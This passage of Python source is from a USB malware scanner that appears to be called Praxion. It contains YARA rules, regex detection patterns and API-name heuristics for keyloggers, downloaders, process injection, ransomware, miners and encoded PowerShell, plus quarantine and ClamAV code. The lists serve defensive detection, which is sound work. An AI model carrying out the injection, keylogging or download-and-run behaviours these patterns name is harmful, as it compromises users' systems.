        (r"fs\.writeFile", "file_system_write"),
        (r"http\.request", "http_requests"),
        (r"net\.connect", "network_connection"),
    ]
    
    # Generic script patterns
    generic_patterns = [
        (r"base64.*decode", "base64_decoding"),
        (r"eval\(.*atob", "javascript_eval_base64"),
        (r"Function\(.*\)", "javascript_dynamic_function"),
        (r"powershell.*-encodedcommand", "powershell_encoded"),
        (r"python.*-c", "python_command_line"),
        (r"node.*-e", "nodejs_command_line"),
    ]
    
    if ext == '.py':
        for pattern, description in python_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                suspicious.append(f"python_{description}")
    
    elif ext in ['.js', '.node']:
        for pattern, description in nodejs_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                suspicious.append(f"nodejs_{description}")
    
    # Check generic patterns for all script types
    for pattern, description in generic_patterns:
        if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
            suspicious.append(f"generic_{description}")
    
    return suspicious if suspicious else None

# ---------------- VirusTotal API Integration ----------------
def virustotal_scan_file(file_path, api_key, timeout=30):
    """
    Scan a file with VirusTotal API
    Returns: (success, result_dict, error_message)
    """
    if not VIRUSTOTAL_AVAILABLE:
        return False, None, "vt-py package not available"
    
    if not api_key:
        return False, None, "VirusTotal API key not provided"
    
    try:
        import vt
        
        # Check file size limit (VirusTotal has 32MB limit for public API, 200MB for premium)
        file_size = os.path.getsize(file_path)
        if file_size > 32 * 1024 * 1024:  # 32MB
            return False, None, f"File too large for VirusTotal ({file_size} bytes)"
        
        client = vt.Client(api_key)
        
        # Upload file for analysis
        with open(file_path, "rb") as f:
            analysis = client.scan_file(f, wait_for_completion=True, timeout=timeout)
        
        # Get analysis results
        result = {
            "id": analysis.id,
            "status": analysis.status,
            "stats": analysis.stats if hasattr(analysis, 'stats') else {},
            "results": {}
        }
        
        # Get detailed results if available
        if hasattr(analysis, 'results'):
            result["results"] = analysis.results
        
        client.close()
        return True, result, None
        
    except Exception as e:
        return False, None, f"VirusTotal scan failed: {e}"

def virustotal_check_hash(file_hash, api_key, timeout=30):
    """
    Check file hash with VirusTotal API
    Returns: (success, result_dict, error_message)
    """
    if not VIRUSTOTAL_AVAILABLE:
        return False, None, "vt-py package not available"
    
    if not api_key:
        return False, None, "VirusTotal API key not provided"
    
    try:
        import vt
        
        client = vt.Client(api_key)
        
        # Try to get file report by hash
        file_object = client.get_object(f"/files/{file_hash}")
        
        result = {
            "md5": getattr(file_object, 'md5', None),
            "sha1": getattr(file_object, 'sha1', None),
            "sha256": getattr(file_object, 'sha256', None),
            "last_analysis_stats": getattr(file_object, 'last_analysis_stats', {}),
            "last_analysis_results": getattr(file_object, 'last_analysis_results', {}),
            "reputation": getattr(file_object, 'reputation', None),
            "popular_threat_classification": getattr(file_object, 'popular_threat_classification', {}),
            "meaningful_name": getattr(file_object, 'meaningful_name', None)
        }
        
        client.close()
        return True, result, None
        
    except Exception as e:
        if "NotFoundError" in str(e):
            return False, None, "File not found in VirusTotal database"
        return False, None, f"VirusTotal hash check failed: {e}"

# ---------------- Enhanced YARA rules ----------------
BUILTIN_YARA_RULES = r'''
rule USB_Autorun_INF { 
    meta: 
        info = "autorun.inf-like content"
        severity = "high"
    strings: 
        $autorun = "open=" nocase
        $shell = "shellexecute=" nocase
        $action = "action=" nocase
    condition: 
        filesize < 64KB and any of them 
}

rule USB_Shortcut { 
    meta: 
        info = "Suspicious LNK shortcut"
        severity = "high"
    strings: 
        $lnk_magic = {4C 00 00 00}
        $cmd = "cmd.exe" ascii nocase
        $powershell = "powershell" ascii nocase
        $wscript = "wscript" ascii nocase
        $cscript = "cscript" ascii nocase
    condition: 
        filesize < 256KB and $lnk_magic at 0 and any of ($cmd, $powershell, $wscript, $cscript)
}

rule Suspicious_Executable_Names {
    meta: 
        info = "Common malware executable names in wrong location"
        severity = "medium"
    strings:
        $name1 = "svchost.exe" nocase
        $name2 = "csrss.exe" nocase
        $name3 = "lsass.exe" nocase
        $name4 = "system32.exe" nocase
        $name5 = "smss.exe" nocase
        $name6 = "winlogon.exe" nocase
    condition:
        uint16(0) == 0x5A4D and any of them
}

rule Ransomware_Extensions {
    meta: 
        info = "Common ransomware file extensions"
        severity = "critical"
    strings:
        $ext1 = ".locked" nocase
        $ext2 = ".encrypted" nocase
        $ext3 = ".crypt" nocase
        $ext4 = ".cerber" nocase
        $ext5 = ".locky" nocase
        $ext6 = ".zepto" nocase
        $ext7 = ".osiris" nocase
        $ext8 = ".wcry" nocase
        $ext9 = ".wncry" nocase
        $ext10 = ".crypto" nocase
    condition:
        any of them
}

rule Office_Macro_Suspicious {
    meta: 
        info = "Office file with suspicious macro indicators"
        severity = "high"
    strings:
        $autoopen1 = "AutoOpen" nocase
        $autoopen2 = "Workbook_Open" nocase
        $autoopen3 = "Document_Open" nocase
        $shell = "WScript.Shell" nocase
        $createobj = "CreateObject" nocase
        $downloadfile = "URLDownloadToFile" nocase
        $powersh = "powershell" nocase
        $exec = "Shell(" nocase
        $magic_doc = {D0 CF 11 E0}
        $magic_zip = {50 4B 03 04}
    condition:
        ($magic_doc at 0 or $magic_zip at 0) and
        (any of ($autoopen*)) and (any of ($shell, $createobj, $downloadfile, $powersh, $exec))
}

rule Cryptocurrency_Miner {
    meta: 
        info = "Potential cryptocurrency miner"
        severity = "medium"
    strings:
        $s1 = "stratum+tcp://" ascii
        $s2 = "xmrig" nocase
        $s3 = "cryptonight" nocase
        $s4 = "monero" nocase
        $s5 = "NiceHash" nocase
        $s6 = "minergate" nocase
        $s7 = "pool.supportxmr" nocase
        $s8 = "nanopool" nocase
    condition:
        2 of them
}

rule Packed_Executable {
    meta: 
        info = "Possibly packed executable"
        severity = "medium"
    strings:
        $upx = "UPX!" ascii
        $aspack = "aPLib" ascii
        $petite = "petite" nocase
        $fsg = ".FSG" ascii
        $mew = "MEW" ascii
    condition:
        uint16(0) == 0x5A4D and any of them
}

rule Keylogger_Indicators {
    meta:
        info = "Potential keylogger indicators"
        severity = "high"
    strings:
        $api1 = "GetAsyncKeyState" ascii
        $api2 = "SetWindowsHookEx" ascii
        $api3 = "GetForegroundWindow" ascii
        $api4 = "GetWindowText" ascii
    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule Network_Download {
    meta:
        info = "Potential downloader"
        severity = "high"
    strings:
        $net1 = "URLDownloadToFile" ascii nocase
        $net2 = "InternetOpen" ascii
        $net3 = "InternetReadFile" ascii
        $net4 = "HttpSendRequest" ascii
        $net5 = "WinHttpOpen" ascii
    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule Persistence_Registry {
    meta:
        info = "Registry persistence mechanism"
        severity = "high"
    strings:
        $reg1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
        $reg2 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" nocase
        $api1 = "RegSetValueEx" ascii
        $api2 = "RegCreateKeyEx" ascii
    condition:
        any of ($reg*) and any of ($api*)
}

rule Double_Extension {
    meta:
        info = "Suspicious double extension"
        severity = "high"
    strings:
        $ext1 = ".pdf.exe" nocase
        $ext2 = ".jpg.exe" nocase
        $ext3 = ".png.exe" nocase
        $ext4 = ".doc.exe" nocase
        $ext5 = ".txt.exe" nocase
        $ext6 = ".zip.exe" nocase
        $ext7 = ".pdf.scr" nocase
        $ext8 = ".jpg.scr" nocase
        $ext9 = ".doc.bat" nocase
        $ext10 = ".txt.cmd" nocase
    condition:
        any of them
}
'''

def load_builtin_rules():
    global compiled_rules
    if YARA_AVAILABLE:
        try:
            compiled_rules = yara.compile(source=BUILTIN_YARA_RULES)
        except Exception as e:
            info(f"Failed to compile YARA rules: {e}")
            compiled_rules = None
    else:
        compiled_rules = None

# ---------------- Enhanced fallback heuristics ----------------
FALLBACK_CONTENT_REGEX = [
    # Process injection
    re.compile(b"CreateRemoteThread", re.IGNORECASE),
    re.compile(b"VirtualAllocEx", re.IGNORECASE),
    re.compile(b"WriteProcessMemory", re.IGNORECASE),
    re.compile(b"NtQuerySystemInformation", re.IGNORECASE),
    re.compile(b"ZwQuerySystemInformation", re.IGNORECASE),
    
    # Keylogger APIs
    re.compile(b"GetAsyncKeyState", re.IGNORECASE),
    re.compile(b"SetWindowsHookEx", re.IGNORECASE),
    
    # Network/Download
    re.compile(b"URLDownloadToFile", re.IGNORECASE),
    re.compile(b"InternetOpen", re.IGNORECASE),
    re.compile(b"HttpSendRequest", re.IGNORECASE),
    re.compile(b"WinHttpOpen", re.IGNORECASE),
    
    # Registry persistence
    re.compile(b"RegSetValue", re.IGNORECASE),
    re.compile(b"RegCreateKey", re.IGNORECASE),
    re.compile(b"CurrentVersion\\\\Run", re.IGNORECASE),
    
    # Process manipulation
    re.compile(b"OpenProcess", re.IGNORECASE),
    re.compile(b"TerminateProcess", re.IGNORECASE),
    re.compile(b"CreateToolhelp32Snapshot", re.IGNORECASE),
    
    # Crypto/Ransomware
    re.compile(b"CryptEncrypt", re.IGNORECASE),
    re.compile(b"CryptDecrypt", re.IGNORECASE),
    re.compile(b"CryptAcquireContext", re.IGNORECASE),
    
    # Anti-debug
    re.compile(b"IsDebuggerPresent", re.IGNORECASE),
    re.compile(b"CheckRemoteDebuggerPresent", re.IGNORECASE),
]

FALLBACK_NAME_PATTERNS = [
    # Autorun
    re.compile(r"\bautorun\b", re.IGNORECASE),
    re.compile(r"\.lnk$", re.IGNORECASE),
    
    # Double extensions
    re.compile(r"\.(pdf|jpg|png|doc|txt|zip)\.(exe|scr|com|pif|bat|cmd)$", re.IGNORECASE),
    
    # Suspicious system names (not in system32)
    re.compile(r"^(svchost|csrss|lsass|smss|winlogon|system32)\.exe$", re.IGNORECASE),
    
    # Hidden executables
    re.compile(r"^\._.*\.exe$", re.IGNORECASE),
    
    # Common malware names on USB root
    re.compile(r"^(update|setup|install|crack|keygen|patch)\.exe$", re.IGNORECASE),
]

def builtin_scan(path):
    matches = []
    name = os.path.basename(path)
    ext = os.path.splitext(name)[1].lower()
    
    # Platform-specific analysis
    if CURRENT_PLATFORM == "linux":
        # ELF analysis
        elf_result = elf_quick_check(path)
        if elf_result:
            matches.append({"type": "elf_analysis", "pattern": elf_result})
        
        # Linux script analysis
        if ext in ['.sh', '.bash', '.zsh']:
            script_result = analyze_linux_script(path)
            if script_result:
                matches.append({"type": "linux_script", "pattern": script_result})
    
    elif CURRENT_PLATFORM == "mac":
        # Mach-O analysis
        macho_result = macho_quick_check(path)
        if macho_result:
            matches.append({"type": "macho_analysis", "pattern": macho_result})
        
        # macOS script analysis
        if ext in ['.sh', '.bash', '.zsh', '.scpt', '.applescript']:
            script_result = analyze_mac_script(path)
            if script_result:
                matches.append({"type": "mac_script", "pattern": script_result})
    
    # Cross-platform script analysis (runs on all platforms)
    if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php']:
        script_result = analyze_cross_platform_scripts(path)
        if script_result:
            matches.append({"type": "cross_platform_script", "pattern": script_result})
    
    # Enhanced filename checks
    filename_checks = [
        (re.compile(r"(?i:^autorun\.inf$)"), "autorun_filename"),
        (re.compile(r"(?i:\.lnk$)"), "shortcut_filename"),
        (re.compile(r"(?i:\.scr$)"), "screensaver"),
        (re.compile(r"(?i:\.ps1$)"), "powershell"),
        (re.compile(r"(?i:\.docm$|\.xlsm$|\.pptm$)"), "office_macro_file"),
        (re.compile(r"(?i:\.bat$|\.cmd$)"), "batch_file"),
        (re.compile(r"(?i:\.vbe$|\.vbs$)"), "vbscript_file"),
        (re.compile(r"(?i:\.hta$)"), "html_application"),
        (re.compile(r"(?i:\.wsf$)"), "windows_script_file"),
        (re.compile(r"(?i:\.(pdf|jpg|png|doc|txt|zip)\.(exe|scr|com|pif|bat|cmd)$)"), "double_extension"),
        (re.compile(r"(?i:^(svchost|csrss|lsass|smss|winlogon|system32)\.exe$)"), "fake_system_process"),
        (re.compile(r"(?i:^(update|setup|install|crack|keygen|patch)\.exe$)"), "suspicious_installer"),
    ]
    
    for patt, tag in filename_checks:
        try:
            if patt.search(name):
                matches.append({"type": "filename", "pattern": tag})
        except Exception:
            pass

    # Read file head for content analysis
    HEAD_READ = 1024 * 1024  # 1 MB
    data = b""
    try:
        size = os.path.getsize(path)
        with open(path, "rb") as fh:
            data = fh.read(min(HEAD_READ, max(8192, size)))
    except Exception:
        data = b""

    try:
        text = data.decode("latin-1", errors="ignore")
        text_lower = text.lower()
    except Exception:
        text = ""
        text_lower = ""

    # Enhanced content checks - scoped to the extensions Praxion already
    # treats as risky (YARA_TARGET_EXTS). Running these regexes (especially
    # the generic "long base64-looking run" pattern) against every file with
    # no extension filter used to false-positive constantly on ordinary data
    # files - e.g. JSON files routinely contain long unbroken strings
    # (package-lock.json integrity hashes, tokens, data URIs) that matched
    # LargeBase64Blob despite being completely benign.
    if ext in YARA_TARGET_EXTS:
        content_checks = [
            (re.compile(r"createremotethread", re.IGNORECASE), "CreateRemoteThread"),
            (re.compile(r"virtualallocex", re.IGNORECASE), "VirtualAllocEx"),
            (re.compile(r"writeprocessmemory", re.IGNORECASE), "WriteProcessMemory"),
            (re.compile(r"getasynckeystate", re.IGNORECASE), "GetAsyncKeyState_Keylogger"),
            (re.compile(r"setwindowshookex", re.IGNORECASE), "SetWindowsHookEx_Keylogger"),
            (re.compile(r"urldownloadtofile", re.IGNORECASE), "URLDownloadToFile_Downloader"),
            (re.compile(r"internetopen|internetreadfile", re.IGNORECASE), "Internet_APIs"),
            (re.compile(r"regsetvalue|regcreatekey", re.IGNORECASE), "Registry_Modification"),
            (re.compile(r"currentversion\\run", re.IGNORECASE), "Startup_Persistence"),
            (re.compile(r"cryptencrypt|cryptdecrypt", re.IGNORECASE), "Crypto_APIs_Ransomware"),
            (re.compile(r"isdebuggerpresent|checkremotedebugger", re.IGNORECASE), "Anti_Debug"),
            (re.compile(r"-encodedcommand\s+[a-z0-9+/=]{40,}", re.IGNORECASE), "PS_EncodedCommand"),
            (re.compile(r"invoke-expression|iex\s*\(", re.IGNORECASE), "Invoke-Expression"),
            (re.compile(r"adodb\.stream", re.IGNORECASE), "ADODB.Stream"),
            (re.compile(r"wscript\.shell", re.IGNORECASE), "WScript.Shell"),
            (re.compile(r"createobject\(|getobject\(", re.IGNORECASE), "VBA_CreateObject"),
            (re.compile(r"autoopen|workbook_open|document_open", re.IGNORECASE), "Office_AutoOpen"),
            (re.compile(r"[A-Za-z0-9+/]{60,}={0,2}"), "LargeBase64Blob"),
        ]

        # Document container formats (pdf/office) legitimately embed binary
        # blobs - fonts, images, embedded objects - so the generic base64
        # pattern is skipped for them specifically; every other content
        # check still applies (e.g. a real macro_autoopen match).
        for patt, tag in content_checks:
            if tag == "LargeBase64Blob" and ext in DOCUMENT_CONTAINER_EXTS:
                continue
            try:
                if patt.search(text):
                    matches.append({"type": "content", "pattern": tag})
            except Exception:
                pass

    # LNK analysis
    if ext == ".lnk" or (len(data) >= 4 and data[:4] == b"\x4C\x00\x00\x00"):
        for s in (b"cmd.exe", b"powershell.exe", b"cscript.exe", b"wscript.exe", b"mshta.exe"):
            try:
                if s in data or s.decode().lower() in text_lower:
                    matches.append({"type": "lnk", "pattern": s.decode()})
            except Exception:
                pass
        if b"\\" in data or "\\" in text:
            matches.append({"type": "lnk", "pattern": "UNC_Path"})

    # PE analysis
    if len(data) >= 2 and data[:2] == b"MZ":
        pe_sigs = [
            b"CreateRemoteThread", b"VirtualAllocEx", b"WriteProcessMemory", 
            b"LoadLibraryA", b"GetProcAddress", b"GetAsyncKeyState",
            b"SetWindowsHookEx", b"URLDownloadToFile", b"RegSetValueEx",
            b"IsDebuggerPresent", b"CheckRemoteDebuggerPresent"
        ]
        for sig in pe_sigs:
            if sig in data:
                matches.append({"type": "pe", "pattern": sig.decode(errors="ignore")})

    # Office macro detection
    if ext in (".docm", ".xlsm", ".doc", ".xls", ".ppt", ".pptx", ".pptm"):
        if re.search(r"autoopen|workbook_open|document_open|createobject\(", text, re.IGNORECASE):
            matches.append({"type": "office", "pattern": "macro_autoopen"})

    # Script detection
    if ext in (".ps1", ".js", ".vbs", ".bat", ".cmd") or "powershell" in text_lower or "-encodedcommand" in text_lower:
        if re.search(r"-EncodedCommand\s+[A-Za-z0-9+/=]{40,}", text):
            matches.append({"type": "powershell", "pattern": "encoded_command"})
        if re.search(r"invoke-expression|iex\s*\(", text, re.IGNORECASE):
            matches.append({"type": "powershell", "pattern": "invoke_expression"})
        if re.search(r"wscript\.shell|createobject|adodb\.stream", text, re.IGNORECASE):
            matches.append({"type": "script", "pattern": "dropper_behavior"})

    # Deduplicate
    seen = set()
    uniq = []
    for m in matches:
        key = (m.get("type"), str(m.get("pattern")))
        if key not in seen:
            seen.add(key)
            uniq.append(m)

    # Weak-signal gate: LargeBase64Blob is a generic pattern (any long
    # unbroken alphanumeric run) that's still occasionally present in
    # legitimate files even within the risky extensions above - a font
    # subset in a .pdf, an embedded resource in a .doc, etc. On its own
    # it isn't enough to call a file malicious; it needs at least one other
    # independent signal to corroborate it. Every other match type here
    # (autorun filenames, actual API name hits, macro autoopen, LNK
    # pointing at cmd.exe, etc.) is specific enough to still trigger alone.
    WEAK_SIGNALS = {("content", "LargeBase64Blob")}
    strong = [m for m in uniq if (m.get("type"), str(m.get("pattern"))) not in WEAK_SIGNALS]
    weak = [m for m in uniq if (m.get("type"), str(m.get("pattern"))) in WEAK_SIGNALS]
    if weak and not strong and len(weak) < 2:
        uniq = []

    if DEBUG_MODE:
        _write_log(f"[DEBUG] builtin_scan({path}) -> {uniq}", DEBUG_LOG_FILE)
    return uniq

# ---------------- Enhanced Explanation helper ----------------
def explanation_for_reasons(reasons):
    lines = []
    if reasons is None:
        return lines
    
    def add_block(title, risk, immediate, prevention, extra=None):
        lines.append(f"Type: {title}")
        lines.append(f"Risk: {risk}")
        lines.append(f"What happens if run: {immediate}")
        lines.append(f"Immediate steps: DO NOT run; disconnect device; analyze in VM or sandbox.")
        lines.append(f"Prevention: {prevention}" + (f" {extra}" if extra else ""))
        lines.append("")
    
    if isinstance(reasons, dict):
        for k, v in reasons.items():
            if k == "fallback" and isinstance(v, list):
                for r in v:
                    typ = r.get("type") if isinstance(r, dict) else None
                    pat = r.get("pattern") if isinstance(r, dict) else str(r)
                    if typ == "filename":
                        if "double_extension" in str(pat):
                            add_block("Double Extension Attack", "File disguised with fake extension to trick users.", 
                                    "Executes malicious code when opened.", "Always check full filename; enable 'show file extensions'.")
                        elif "fake_system" in str(pat):
                            add_block("Fake System Process", "Malware impersonating legitimate Windows process.", 
                                    "May steal data, create backdoor, or cause system instability.", "Only run system files from System32 folder.")
                        else:
                            add_block("Suspicious Filename", "May auto-launch or trick users.", 
                                    "May cause execution when device is accessed.", "Disable autorun; scan first.")
                    elif typ == "lnk":
                        add_block("Malicious Shortcut (.lnk)", "Points to cmd/powershell or UNC paths.", 
                                "Can execute system utilities or download malware when opened.", "Do not open unknown shortcuts.")
                    elif typ == "pe":
                        add_block("Suspicious PE APIs", f"Contains {pat} API", 
                                "May inject into processes, log keystrokes, or download payloads.", "Do not execute; analyze in sandbox.")
                    elif typ == "content":
                        if "Keylogger" in str(pat):
                            add_block("Keylogger Detection", "Contains keylogging API calls.", 
                                    "Will record all keystrokes including passwords.", "Do not run; may steal credentials.")
                        elif "Downloader" in str(pat):
                            add_block("Downloader Trojan", "Contains download APIs.", 
                                    "Will download and execute additional malware.", "Block network access; quarantine.")
                        elif "Ransomware" in str(pat):
                            add_block("Ransomware Indicators", "Contains encryption APIs.", 
                                    "May encrypt files and demand ransom payment.", "Disconnect immediately; restore from backup.")
                        else:
                            add_block(f"Suspicious Content: {pat}", "Strings commonly found in malware.", 
                                    "May drop or execute payloads.", "Analyze in isolated environment.")
                    elif typ == "elf_analysis":
                        add_block("Linux ELF Malware", "Suspicious executable characteristics detected", 
                                "May install persistence, keylogger, or backdoor", "Do not execute; analyze in sandbox")
                    elif typ == "macho_analysis":
                        add_block("macOS Mach-O Malware", "Suspicious macOS executable detected",
                                "May gain persistence via launchd or install keylogger", "Do not run on Mac systems")
                    elif typ == "linux_script":
                        add_block("Malicious Linux Script", "Suspicious shell script patterns",
                                "May download malware, modify system files, or create backdoors", "Do not execute; review script content")
                    elif typ == "mac_script":
                        add_block("Malicious macOS Script", "Suspicious AppleScript or shell script",
                                "May request admin privileges or install persistence", "Do not run; check script source")
                    elif typ == "cross_platform_script":
                        add_block("Cross-Platform Malicious Script", "Suspicious Python/Node.js/Ruby code",
                                "May run on multiple platforms, steal data, or download malware", "Do not execute; analyze code")
                    else:
                        add_block("Suspicious Pattern", f"Pattern: {pat}", "Could be malicious.", "Do not execute; analyze.")
            elif k == "yara":
                rules = v if isinstance(v, (list, tuple)) else [v]
                for rule in rules:
                    add_block(f"YARA Detection: {rule}", "YARA signature matched; indicates heuristic detection.", 
                            "Behavior matches known malware patterns.", "Submit sample to sandbox for analysis.")
            elif k == "clamav":
                add_block("Antivirus Detection", f"ClamAV flagged: {v}", "Known malicious sample in AV database.", 
                        "Quarantine immediately and scan entire system.")
            elif k == "pe":
                add_block("PE Heuristic Analysis", f"{v}", "Suspicious executable characteristics detected.", 
                        "May use packing, obfuscation, or suspicious imports.", "Do not execute; analyze in VM.")
            elif k == "virustotal":
                add_block("VirusTotal Detection", f"{v}", "Multiple antivirus engines detected this as malicious.", 
                        "Confirmed threat by crowd-sourced analysis.", "Quarantine immediately and scan system.")
            else:
                add_block(str(k), str(v), "Unknown threat — treat as suspicious.", "Do not execute; isolate and analyze.")
    elif isinstance(reasons, list):
        for r in reasons:
            add_block(str(r), "Pattern match", "Possibly malicious.", "Do not execute; analyze in a VM.")
    else:
        add_block("Suspicious", str(reasons), "Possibly malicious.", "Do not execute; analyze in a VM.")
    
    if len(lines) > 200:
        lines = lines[:200] + ["(Truncated explanation...)"]
    return lines

# ---------------- Safe quarantine & evidence ----------------
def compute_hashes(path):
    out = {"sha256": None, "ppdeep": None}
    try:
        sha256 = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
        out["sha256"] = sha256.hexdigest()
    except Exception:
        out["sha256"] = None

    if PPDEEP_AVAILABLE:
        try:
            out["ppdeep"] = ppdeep.hash_from_file(path)
        except Exception:
            out["ppdeep"] = None
    return out

def quarantine_copy(src_path, quarantine_dir, reason, drive_label, auto_delete=False):
    try:
        os.makedirs(quarantine_dir, exist_ok=True)
        basename = os.path.basename(src_path)
        # time.time() has only ~second resolution, so scanning several
        # threats in the same second produced identical dest_names and
        # silently overwrote earlier quarantined evidence. time_ns() plus a
        # short random token keeps every quarantined copy unique.
        unique_tag = f"{time.time_ns()}_{os.urandom(4).hex()}"
        dest_name = f"{basename}_{unique_tag}"
        dest_path = os.path.join(quarantine_dir, dest_name)
        
        shutil.copy2(src_path, dest_path)
        hashes = compute_hashes(dest_path)
        
        # Fix deprecation warning - use timezone-aware datetime
        try:
            from datetime import timezone
            detected_time = datetime.now(timezone.utc).isoformat()
        except Exception:
            detected_time = datetime.utcnow().isoformat() + "Z"
        
        evidence = {
            "original_path": src_path,
            "quarantine_path": dest_path,
            "detected_at": detected_time,
            "drive_label": drive_label,
            "reason": reason,
            "hashes": hashes
        }
        
        evid_path = dest_path + ".evidence.json"
        with open(evid_path, "w", encoding="utf-8") as ef:
            json.dump(evidence, ef, indent=2)
        
        st = os.stat(dest_path)
        new_mode = st.st_mode & ~(stat.S_IWUSR | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        os.chmod(dest_path, new_mode)
        
        if DEBUG_MODE:
            _write_log(f"[DEBUG] quarantine_copy created {dest_path} and {evid_path}", DEBUG_LOG_FILE)
        
        if auto_delete:
            try:
                os.remove(src_path)
            except Exception as e:
                log_threat(src_path, f"Failed to delete original after quarantine: {e}")
        return dest_path
    except Exception as e:
        log_threat(src_path, f"Quarantine copy error: {e}")
        if DEBUG_MODE:
            import traceback
            _write_log(f"[DEBUG] Quarantine traceback: {traceback.format_exc()}", DEBUG_LOG_FILE)
        return None

# ---------------- Report generation ----------------
def save_explanation_report(moved_sample_path, drive_label, reasons):
    try:
        # moved_sample_path's basename is already made unique by
        # quarantine_copy() (nanosecond timestamp + random token), so build
        # the report name directly from it. Previously this ran the name
        # through os.path.splitext(), which mistook that unique suffix for a
        # file extension and stripped it, then re-added only a whole-second
        # timestamp - causing two files quarantined in the same second
        # (e.g. dropper.exe and dropper.ps1) to overwrite each other's report.
        base = os.path.basename(moved_sample_path)
        rpt_name = f"{base}.report.txt"
        rpt_path = os.path.join(QUARANTINE_DIR, rpt_name)
        expl_lines = explanation_for_reasons(reasons)
        
        with open(rpt_path, "w", encoding="utf-8") as rf:
            rf.write(f"Original drive: {drive_label}\n")
            rf.write(f"Sample moved: {moved_sample_path}\n")
            rf.write(f"Detected at: {now_ts()}\n\n")
            rf.write("Explanation & Guidance:\n")
            rf.write("\n".join(expl_lines))
        return rpt_path
    except Exception as e:
        _write_log(f"[ERROR] save_explanation_report: {e}", DEBUG_LOG_FILE)
        return None

def simple_report_console(path, drive_label, status, reasons=None):
    if status == "SAFE":
        _bump_stat("safe")
        cprint(f"{COLOR_SAFE}[✓ SAFE]{COLOR_RESET} {path}")
        log_history(path, "SAFE")
    elif status == "SKIPPED":
        # File could not actually be scanned (vanished mid-scan, read error,
        # unexpected exception, etc.) - this must NOT be counted or reported
        # as a verified-safe file, otherwise a file that failed to scan could
        # silently be treated as cleared.
        _bump_stat("errors")
        detail = reasons if isinstance(reasons, str) else "scan incomplete"
        log_history(path, f"SKIPPED - {detail}")
        cprint(f"{COLOR_ACCENT_B}[! SKIPPED]{COLOR_RESET} {path} {COLOR_DIM}-{COLOR_RESET} {detail} (not verified safe)")
    else:
        try:
            basename = os.path.basename(path)
            # Always quarantine and delete original from USB
            dest = quarantine_copy(path, QUARANTINE_DIR, reasons, drive_label, auto_delete=True)
            if not dest:
                _bump_stat("errors")
                err_msg = f"Failed to quarantine {path} - check file permissions and disk space"
                log_threat(path, err_msg)
                cprint(f"{COLOR_PRIMARY_B}[✕ ERROR]{COLOR_RESET} {err_msg}")
                return
            
            expl_lines = explanation_for_reasons(reasons)
            expl_text = " | ".join(expl_lines[:6]) if expl_lines else "No detailed explanation."
            log_history(path, "MALICIOUS - QUARANTINED & REMOVED")
            log_threat(path, expl_text)
            
            rpt = save_explanation_report(dest, drive_label, reasons)
            _bump_stat("malicious")
            cprint(f"{COLOR_PRIMARY_B}[☠ MALICIOUS]{COLOR_RESET} {basename} {COLOR_DIM}->{COLOR_RESET} removed from USB & quarantined")
            if rpt:
                cprint(f"{COLOR_ACCENT_B}[▤ REPORT]{COLOR_RESET} {os.path.basename(rpt)}")
        except Exception as e:
            _bump_stat("errors")
            log_threat(path, f"Error quarantining file: {e}")
            cprint(f"{COLOR_PRIMARY_B}[✕ ERROR]{COLOR_RESET} Could not quarantine {path}: {e}")

# ---------------- ClamAV detection ----------------
# shutil.which() only looks at directories on PATH. ClamAV frequently ends up
# installed but NOT on PATH (Windows installer defaults to Program Files,
# Homebrew on Apple Silicon uses /opt/homebrew/bin which GUI-launched shells
# often don't inherit, some Linux distros drop it in /usr/sbin, etc). That's
# the usual reason Praxion used to report "not installed" even though it was.
# We now fall back to checking common install locations directly.
def _find_binary(names):
    from shutil import which
    for name in names:
        p = which(name)
        if p:
            return p

    if sys.platform.startswith("win"):
        extra_dirs = [
            r"C:\Program Files\ClamAV",
            r"C:\Program Files (x86)\ClamAV",
            r"C:\ClamAV",
            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "ClamAV"),
        ]
    elif sys.platform == "darwin":
        extra_dirs = [
            "/usr/local/bin", "/opt/homebrew/bin", "/opt/local/bin",
            "/usr/local/clamav/bin", "/Applications/ClamAV/bin",
        ]
    else:
        extra_dirs = [
            "/usr/bin", "/usr/local/bin", "/usr/sbin", "/sbin",
            "/bin", "/snap/bin", "/opt/clamav/bin",
        ]

    for d in extra_dirs:
        for name in names:
            candidate = os.path.join(d, name)
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
    return None

def find_clamscan():
    return _find_binary(["clamscan", "clamscan.exe"])

def find_clamdscan():
    return _find_binary(["clamdscan", "clamdscan.exe"])

def _clamdscan_ready(path):
    """clamdscan needs a running clamd daemon behind it; confirm it actually
    responds instead of just checking the binary exists."""
    if not path:
        return False
    try:
        proc = subprocess.run([path, "--version"], capture_output=True, text=True, timeout=5)
        return proc.returncode == 0
    except Exception:
        return False

def _clamav_download_hint():
    """Tell the user exactly which ClamAV build to grab for THIS machine.
    The most common setup failure (confirmed the hard way) is downloading a
    build for the wrong CPU architecture, e.g. grabbing the ARM64 .msi on a
    normal x64 PC - it installs fine but every executable then fails with
    'not a valid application for this OS platform'."""
    machine = platform.machine().lower()

    if machine in ("amd64", "x86_64"):
        arch = "x64"
    elif machine in ("arm64", "aarch64"):
        arch = "ARM64"
    elif machine in ("x86", "i386", "i686"):
        arch = "win32 (x86)"
    else:
        arch = machine or "unknown"

    if sys.platform.startswith("win"):
        return (f"Detected Windows / {arch}. Download the Windows installer whose "
                f"filename contains '{arch.split()[0].lower()}' from "
                f"https://www.clamav.net/downloads (e.g. clamav-X.Y.Z.win.{arch.split()[0].lower()}.msi) "
                f"- grabbing the wrong architecture build is the #1 cause of ClamAV "
                f"'installed but nothing works' problems on Windows. "
                f"See CLAMAV_SETUP.md for full setup steps.")
    elif sys.platform == "darwin":
        return ("Detected macOS. Easiest install: 'brew install clamav'. "
                "See CLAMAV_SETUP.md for full setup steps.")
    else:
        return ("Detected Linux. Install via your package manager, e.g. "
                "'sudo apt install clamav clamav-daemon' (Debian/Ubuntu) or "
                "'sudo dnf install clamav clamd' (Fedora/RHEL). "
                "See CLAMAV_SETUP.md for full setup steps.")

